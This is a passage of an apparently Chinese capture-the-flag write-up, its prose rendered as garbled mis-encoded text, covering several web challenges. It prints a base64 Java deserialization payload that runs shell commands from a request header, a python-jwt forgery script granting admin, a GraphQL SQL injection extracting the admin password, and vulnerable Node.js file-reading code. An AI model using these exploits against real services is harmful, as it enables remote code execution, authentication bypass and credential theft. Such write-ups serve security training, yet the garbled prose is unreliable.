FsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIkx5c29zZXJpYWwvcGF5bG9hZHMvZXZpbC9FdmlsVGVzdDsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAkQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQABYwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQABbQEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAm0xAQAEcmVzcAEAA3JlcQEACWdldFdyaXRlcgEACWdldEhlYWRlcgEABndyaXRlcgEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbW1hbmRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2NoYXJzZXROYW1lAQANU3RhY2tNYXBUYWJsZQcAjwcAZwcAkgcAaQcAcgcAUwcAkwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDABCAEMHAJQMAJUAlgwAlwCYAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyBwCZDACaAJsBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAD2phdmEvbGFuZy9DbGFzcwwAnACdAQAQamF2YS9sYW5nL09iamVjdAcAkgwAngCfAQBAb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlNlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwEAC2dldFJlc3BvbnNlAQAKZ2V0UmVxdWVzdAEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlDACgAJ0BACVqYXZheC5zZXJ2bGV0Lmh0dHAuSHR0cFNlcnZsZXRSZXF1ZXN0AQAQamF2YS9sYW5nL1N0cmluZwwAoQCiAQAHb3MubmFtZQcAowwApAClDACmAKcBAAZ3aW5kb3cMAKgAqQEAA0dCSwEABVVURi04DACqAKcBAANXSU4BAAIvYwEABy9iaW4vc2gBAAItYwwAqwCsAQAHcHJpbnRsbgEAEWphdmEvdXRpbC9TY2FubmVyBwCtDACuAK8MALAAsQcAsgwAswC0DABCALUBAAJcQQwAtgC3DAC4AKcBAAVmbHVzaAEABWNsb3NlAQAgeXNvc2VyaWFsL3BheWxvYWRzL2V2aWwvRXZpbFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFnZXREZWNsYXJlZE1ldGhvZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAt0b1VwcGVyQ2FzZQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAAhAC4ALwAAAAAAAwABADAAMQACADIAAAA/AAAAAwAAAAGxAAAAAgAzAAAABgABAAAAEQA0AAAAIAADAAAAAQA1ADYAAAAAAAEANwA4AAEAAAABADkAOgACADsAAAAEAAEAPAABADAAPQACADIAAABJAAAABAAAAAGxAAAAAgAzAAAABgABAAAAFgA0AAAAKgAEAAAAAQA1ADYAAAAAAAEANwA4AAEAAAABAD4APwACAAAAAQBAAEEAAwA7AAAABAABADwAAQBCAEMAAgAyAAACwwAJAA0AAAF7KrcAAbgAArYAAxIEtgAFTCsSBgO9AAe2AAhNLAEDvQAJtgAKTrgAArYAAxILtgAFTCsSDAO9AAe2AAhNKxINA70AB7YACDoELC0DvQAJtgAKOgUZBC0DvQAJtgAKOga4AAK2AAMSDrYABRIPA70AB7YAEDoHuAACtgADEhG2AAUSEgS9AAdZAxITU7YAEDoIGQgEtgAUGQcEtgAUGQcZBQO9AAm2AAo6CRkIGQYEvQAJWQMSFVO2AArAABM6Cga9ABM6CxIWuAAXtgAYEhm2ABqZAAgSG6cABRIcOgwSFrgAF7YAHRIetgAamQASGQsDEhVTGQsEEh9TpwAPGQsDEiBTGQsEEiFTGQsFGQpTGQm2ACISIwS9AAdZAxITU7YAEBkJBL0ACVkDuwAkWbgAJRkLtgAmtgAnGQy3ACgSKbYAKrYAK1O2AApXGQm2ACISLAO9AAe2ABAZCQO9AAm2AApXGQm2ACISLQO9AAe2ABAZCQO9AAm2AApXsQAAAAMAMwAAAG4AGwAAABcABAAaABAAGwAbABwAJQAdADEAHgA8AB8ASAAgAFMAIQBfACIAdQAjAJAAJACWACUAnAAmAKkAJwC+ACgAxAApAN0AKgDtACsA8wAsAPwALgECAC8BCAAxAQ4AMgFKADMBYgA0AXoANQA0AAAAhAANAAABewA1ADYAAAAQAWsARABFAAEAGwFgAEYARwACACUBVgBIAEkAAwBIATMASgBHAAQAUwEoAEsASQAFAF8BHABMAEkABgB1AQYATQBHAAcAkADrAE4ARwAIAKkA0gBPAEkACQC+AL0AUABRAAoAxAC3AFIAUwALAN0AngBUAFEADABVAAAAOAAE/wDZAAwHAFYHAFcHAFgHAFkHAFgHAFkHAFkHAFgHAFgHAFkHAFoHAFsAAEEHAFr8ACAHAFoLADsAAAAEAAEAXAABAF0AAAACAF5wdAAFYW1ldXVwdwEAeHEAfgAReA==&#x27;</span></span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="built_in">print</span>(requests.post(<span class="string">&#x27;http://39.106.13.71:18962/myTest&#x27;</span>, data=data, headers=&#123;<span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;cat /flag&#x27;</span>&#125;).text)</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18e4ba5e-7907-44f2-baba-2ac04b6787b4&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FunWEB"><a href="#FunWEB" class="headerlink" title="FunWEB"></a>FunWEB</h3><ul>
<li>flask python-jwt</li>
</ul>
<p>ç›´æ¥æ‰“å¼€æ˜¯ç™»å½•æ³¨å†Œç•Œé¢ï¼ŒçŒœæµ‹å¯èƒ½æœ‰SQLæ³¨å…¥ï¼Œå°±æ˜¯ä¸çŸ¥é“ç¯å¢ƒæ˜¯ä»€ä¹ˆï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·è¿›å»ï¼Œå‘ç°æœ‰ä¸‰ä¸ªè·¯ç”±getFlagã€graphqlã€logout</p>
<p>ä½†æ˜¯å‰é¢ä¸¤ä¸ªéƒ½éœ€è¦adminç™»å½•ï¼ŒæŸ¥çœ‹cookieå‘ç°æœ‰sessionå’Œtokenï¼Œsessionæ˜¯flask sessionï¼Œå¼ºè¡Œè§£å¯†å‘ç°åªæ˜¯ç”¨æ¥è®°å½•æ˜¯å¦ç™»å½•çš„ã€‚è€Œtokenæ˜¯jwtï¼Œä¼šè®°å½•æ˜¯ä¸æ˜¯adminï¼Œé‚£ä¹ˆå¦‚æœæƒ³æˆä¸ºadminé‚£å°±æ˜¯è¦æ‰¾åˆ°ç§˜é’¥äº†ï¼Œä½†æ˜¯å®Œå…¨æ²¡æœ‰æ€è·¯è¯¥æ€ä¹ˆå»æ‰¾åˆ°ç§˜é’¥ï¼Œæ‰“ç®—ä»JWTæ”»å‡»å…¥æ‰‹</p>
<p>æŠŠtokenæ”¾åˆ°jwt.ioä¸Šçœ‹ï¼Œå‘ç°æ˜¯PS256åŠ å¯†ï¼Œæ˜¯éå¯¹ç§°åŠ å¯†â€¦â€¦</p>
<p>ä¹‹åå°±å¡äº†å¾ˆä¹…å¾ˆä¹…ï¼Œç”šè‡³è¿˜æˆæ”¹æˆå¯¹ç§°åŠ å¯†å»çˆ†ç ´ç§˜é’¥â€¦â€¦</p>
<p><img src="https://img-blog.csdnimg.cn/12808644c7c64114b68a497f09118316.png" alt="Untitled"></p>
<p>pythonç¯å¢ƒä¸‹çš„jwtï¼Œgoogleåˆ°äº†<a href="https://github.com/davedoesdev/python-jwt">https://github.com/davedoesdev/python-jwt</a>ï¼Œå¯ä»¥å‘ç°è¿‘æœŸåˆšå‡ºä¸€ä¸ªCVEï¼Œè¿˜æ˜¯å…³äºtokenè®¤è¯çš„ï¼Œé‚£è¿™æ¬¡çš„è€ƒç‚¹åº”è¯¥å°±æ˜¯è¿™é‡Œäº†</p>
<p><img src="https://img-blog.csdnimg.cn/f40d965eccdf4d7c9a05460af661ad7c.png" alt="Untitled"></p>
<p>ç›´æ¥æŸ¥çœ‹è¯¦æƒ…ï¼Œå¯ä»¥å‘ç°æ¼æ´ç‚¹æ˜¯JWTè§£æå™¨å’Œjwtcryptoä¾èµ–ä¸ä¸€è‡´é€ æˆçš„ï¼Œä½†è¿˜æ˜¯æœ‰ç‚¹ä¸çŸ¥é“è¯¥æ€ä¹ˆå…¥æ‰‹ï¼Œ</p>
<p><img src="https://img-blog.csdnimg.cn/61171b5c778e4b9c9b50b6721581ac7d.png" alt="Untitled"></p>
<p>æŸ¥çœ‹commitï¼Œåœ¨æœ€åæœ‰ä¸€ä¸ª<code>vulnerability_vows.py</code> ï¼Œä»”ç»†å®¡è®¡ä¸€ä¸‹å¯ä»¥å‘ç°è¿™ä¸ªå°±æ˜¯ç”¨æ¥æµ‹è¯•æ¼æ´æ˜¯å¦ä¿®å¤æˆåŠŸçš„ï¼Œé‚£ä»å¦ä¸€æ–¹é¢æ¥è¯´æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™å’Œè„šæœ¬ä¼ªé€ token</p>
<p><img src="https://img-blog.csdnimg.cn/48e495a6808e435eba0f43cae850d21d.png" alt="Untitled"></p>
<p>ç›´æ¥å°†æ•´ä¸ªæœ€æ–°ç‰ˆçš„python-jwtä»githubä¸Šé¢æ‹¿ä¸‹æ¥ï¼Œåˆ©ç”¨é‡Œé¢çš„teståŒ…æ„é€ expï¼Œç„¶ååœ¨ç¯å¢ƒé‡Œé¢å®‰è£…python-jwt3.3.3ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> fixtures <span class="keyword">import</span> generated_keys</span><br><span class="line"><span class="keyword">import</span> python_jwt <span class="keyword">as</span> jwt</span><br><span class="line"><span class="comment"># from pyvows import Vows, expect</span></span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fakePayload</span>(<span class="params">topic</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print(topic)</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    parsed_payload[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">2000000000</span></span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zef45s04koksrnwzpys.cloudeci1.ichunqiu.com/&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMjQ2ODksImlhdCI6MTY2NzEyNDM4OSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJDSFNEemZIbHJpcTJZbmU3Ynhrc2lRIiwibmJmIjoxNjY3MTI0Mzg5LCJwYXNzd29yZCI6ImFtZXV1IiwidXNlcm5hbWUiOiJhbWV1dSJ9.nlAxl5xunioWsD7UkEY35CGu69F9JMI3B4tCTI5zG-HH5XxbgJIDjheBgYH83QOs7wuu7nRWnuzBGBvXZpoTdjXDklD8ob69-Z9h0UvYB8J9_AwySCssHOw_2d2w4B4EmhTsZ0JXv78KOgIIYKZeI4mX3RohGceGGTMLw92KW0V4IGaZulLXBl9HWw0qfnwXEOY0vNmbofCu3i_Ee1v0m6NWF2ytrLwspkJ59Xj09FXG2oEPzRC-Mx4RBgm5b2xX66RNJcwJhqiwAeRLJ3of0kr5Oo2-3VIjpNUsxgcEUUojk561CT0Lj3NO4kzfJ88gbQwnZ4f-gcg2Kg7IbVa7Tg&#x27;</span></span><br><span class="line">token = fakePayload(a)</span><br><span class="line">r = requests.get(url + <span class="string">&#x27;getflag&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">                           <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾<code>only currect password can readflag</code> ï¼Œè¯´æ˜æˆ‘ä»¬å¾—æ‹¿åˆ°flagï¼Œè€Œè¿˜æœ‰ä¸€ä¸ªæŸ¥çœ‹æˆç»©çš„graphqlè·¯ç”±å¯ä»¥è¿›è¡Œgrqphqlæ³¨å…¥</p>
<p><a href="https://www.secpulse.com/archives/148242.html#:~:text=graphql%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%B8%80%E8%88%AC%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E4%BC%BC%EF%BC%8C%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E8%AF%AD%E5%8F%A5%E8%BE%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E6%88%96%E6%94%B9%E5%8F%98%E6%9F%A5%E8%AF%A2%E9%80%BB%E8%BE%91%E7%9A%84%E7%9B%AE%E7%9A%84%E3%80%82,p%E7%A5%9E%E5%9C%A8%E5%85%88%E7%9F%A5%E5%A4%A7%E4%BC%9A%E4%B8%8A%E8%AE%B2%E8%BF%87%E8%AF%A5%E7%B1%BB%E9%97%AE%E9%A2%98%EF%BC%8C%E5%80%9F%E7%94%A8p%E7%A5%9E%E7%9A%842%E5%BC%A0PPT%E3%80%82">https://www.secpulse.com/archives/148242.html</a></p>
<p><a href="https://graphql.cn/learn/queries/#variables">https://graphql.cn/learn/queries/#variables</a></p>
<p>graphqlæ³¨å…¥æŸ¥è¯¢åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;__type&#x27;: &#123;&#x27;name&#x27;: &#x27;Getscorebyid&#x27;, &#x27;fields&#x27;: [&#123;&#x27;name&#x27;: &#x27;score&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;name&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;id&#x27;&#125;]&#125;&#125;</span><br><span class="line">&#123;&#x27;__type&#x27;: &#123;&#x27;name&#x27;: &#x27;Getscorebyname&#x27;, &#x27;fields&#x27;: [&#123;&#x27;name&#x27;: &#x27;score&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;name&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;userid&#x27;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆexpï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> fixtures <span class="keyword">import</span> generated_keys</span><br><span class="line"><span class="keyword">import</span> python_jwt <span class="keyword">as</span> jwt</span><br><span class="line"><span class="comment"># from pyvows import Vows, expect</span></span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fakePayload</span>(<span class="params">topic</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print(topic)</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    parsed_payload[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    parsed_payload[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&quot;i2Ip4m1Jx3iWMbtVRywc&quot;</span></span><br><span class="line">    parsed_payload[<span class="string">&#x27;exp&#x27;</span>] = <span class="number">2000000000</span></span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zef45s04koksrnwzpys.cloudeci1.ichunqiu.com/&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxMjQ2ODksImlhdCI6MTY2NzEyNDM4OSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJDSFNEemZIbHJpcTJZbmU3Ynhrc2lRIiwibmJmIjoxNjY3MTI0Mzg5LCJwYXNzd29yZCI6ImFtZXV1IiwidXNlcm5hbWUiOiJhbWV1dSJ9.nlAxl5xunioWsD7UkEY35CGu69F9JMI3B4tCTI5zG-HH5XxbgJIDjheBgYH83QOs7wuu7nRWnuzBGBvXZpoTdjXDklD8ob69-Z9h0UvYB8J9_AwySCssHOw_2d2w4B4EmhTsZ0JXv78KOgIIYKZeI4mX3RohGceGGTMLw92KW0V4IGaZulLXBl9HWw0qfnwXEOY0vNmbofCu3i_Ee1v0m6NWF2ytrLwspkJ59Xj09FXG2oEPzRC-Mx4RBgm5b2xX66RNJcwJhqiwAeRLJ3of0kr5Oo2-3VIjpNUsxgcEUUojk561CT0Lj3NO4kzfJ88gbQwnZ4f-gcg2Kg7IbVa7Tg&#x27;</span></span><br><span class="line">token = fakePayload(a)</span><br><span class="line"><span class="comment"># data = &#123;&#x27;query&#x27;: &#x27;&#123; __schema&#123; types &#123; name &#125; &#125; &#125;&#x27;&#125;</span></span><br><span class="line"><span class="comment"># data = &#123;&#x27;query&#x27;: &#x27;&#123; __type(name: &quot;__EnumValue&quot;) &#123; name fields &#123; name type &#123; name kind ofType &#123; name kind &#125; &#125; &#125; &#125; &#125;&#x27;&#125;</span></span><br><span class="line"><span class="comment"># data = &#123;&#x27;query&#x27;: &#x27;&#123; __fields(name: &quot;getscoreusingnamehahaha&quot;)  &#123; name &#125;  &#125;&#x27;&#125;</span></span><br><span class="line"><span class="comment"># data = &#123;&#x27;query&#x27;: &#x27;&#123; Getscorebyname(name: &quot;admin&quot;)&#123; userid name score &#125; &#125;&#x27;&#125;</span></span><br><span class="line">data = &#123;<span class="string">&#x27;query&#x27;</span>: <span class="string">&#x27;&#123; getscoreusingnamehahaha(name:&quot;name\&#x27;union select password from users where name=\&#x27;admin\&#x27; and \&#x27;1=1&quot;)&#123; userid name score &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;&#125; &#125;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url + <span class="string">&#x27;graphql&#x27;</span>,</span><br><span class="line">                  cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">                           <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k&#x27;</span>&#125;,</span><br><span class="line">                  data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">r = requests.get(url + <span class="string">&#x27;getflag&#x27;</span>, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token,</span><br><span class="line">                           <span class="string">&#x27;session&#x27;</span>: <span class="string">&#x27;eyJpc19sb2dpbiI6MX0.Y15HzQ.WwPKCovExkTsVcmU5hVuWIdjj4k&#x27;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;9f065df3-23ae-438f-ae09-56d36a400b52&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RustWaf"><a href="#RustWaf" class="headerlink" title="RustWaf"></a>RustWaf</h3><p><code>/src</code>å¾—åˆ°nodejsæºä»£ç </p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>)</span><br><span class="line">app.use(bodyParser.text(&#123;<span class="attr">type</span>: <span class="string">&#x27;*/*&#x27;</span>&#125;));</span><br><span class="line"><span class="keyword">const</span> &#123; Â execFileSync &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/readfile&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> Â  Â <span class="keyword">let</span> body = req.body.toString();</span><br><span class="line"> Â  Â <span class="built_in">console</span>.log(<span class="string">&quot;bosy = &quot;</span>+body + <span class="string">&quot;;&quot;</span>);</span><br><span class="line"> Â  Â <span class="keyword">let</span> file_to_read = <span class="string">&quot;app.js&quot;</span>;</span><br><span class="line"> Â  Â  <span class="keyword">const</span> file = execFileSync(<span class="string">&#x27;/app/rust-waf&#x27;</span>, [body], &#123;</span><br><span class="line"> Â  Â  Â  Â  <span class="attr">encoding</span>: <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"> Â  Â  &#125;).trim();</span><br><span class="line"> Â  Â <span class="keyword">const</span> file = body;</span><br><span class="line"> Â  Â <span class="keyword">try</span> &#123;</span><br><span class="line"> Â  Â  Â  Â file_to_read = <span class="built_in">JSON</span>.parse(file)</span><br><span class="line"> Â   &#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line"> Â  Â  Â  Â file_to_read = file</span><br><span class="line"> Â   &#125;</span><br><span class="line"> Â  Â <span class="built_in">console</span>.log(<span class="string">&quot;file_to_read = &quot;</span> + file_to_read + <span class="string">&quot;;&quot;</span>);</span><br><span class="line"> Â  Â <span class="keyword">let</span> data = fs.readFileSync(file_to_read);</span><br><span class="line"> Â  Â <span class="built_in">console</span>.log(<span class="string">&quot;data = &quot;</span> + data);</span><br><span class="line"> Â  Â <span class="comment">// res.send(data.toString());</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> Â  Â res.send(<span class="string">&#x27;see `/src`&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/src&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> Â  Â <span class="keyword">var</span> data = fs.readFileSync(<span class="string">&#x27;app.js&#x27;</span>);</span><br><span class="line"> Â  Â res.send(data.toString());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"> Â  Â <span class="built_in">console</span>.log(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä»£ç æ¯”è¾ƒç®€å•ï¼Œé‡ç‚¹å°±æ˜¯åœ¨<code>/readfile</code>ç›®å½•ä¸‹è¯»å–æ–‡ä»¶ï¼Œè€Œä¼šç›´æ¥ä»post bodyè·å–æ–‡ä»¶åï¼Œç›´æ¥ç”¨bpä¼ ï¼Œæµ‹è¯•è¯»å–<code>app.js</code>æˆåŠŸ</p>
<p><img src="https://img-blog.csdnimg.cn/4fde64a0c7c6406f91c0b7f76d7d38fe.png" alt="Untitled"></p>
